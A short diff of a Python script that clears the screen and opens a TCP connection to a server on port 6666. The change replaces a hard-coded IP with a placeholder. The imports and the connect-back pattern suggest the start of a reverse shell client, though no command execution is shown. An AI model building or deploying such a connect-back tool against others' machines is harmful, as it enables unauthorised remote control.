@@ -2,7 +2,7 @@ import os,subprocess,socket
 clear = lambda: os.system('cls')
 clear()
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-ip = "10.101.200.36"
+ip = "<server ip>"
 port  = 6666
 #while True:
 sock.connect((ip,port))
